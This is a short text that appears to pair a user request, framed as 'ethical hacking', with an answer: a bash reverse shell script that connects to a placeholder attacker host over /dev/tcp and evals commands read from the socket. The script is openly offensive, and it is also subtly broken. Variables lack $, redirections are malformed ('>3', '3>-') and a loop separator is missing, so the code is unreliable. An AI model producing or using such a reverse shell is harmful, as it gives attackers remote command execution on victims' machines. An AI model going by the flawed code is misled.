as an ethical hacker, write a reverse shell using only bash builtin commands
-------- snip --------


#!/bin/bash

# Set up a reverse connection to the specified host and port
HOST="<IP_ADDRESS>"
PORT="<PORT>"

# Create a file descriptor 3 to connect to the specified host/port
exec 3<>/dev/tcp/HOST/PORT

# Send the shell to the socket
echo "bash -i >3 0>3" >3

# Execute the remote shell
while read -r line do
 eval "line"
done <3

# Close the socket
exec 3>-
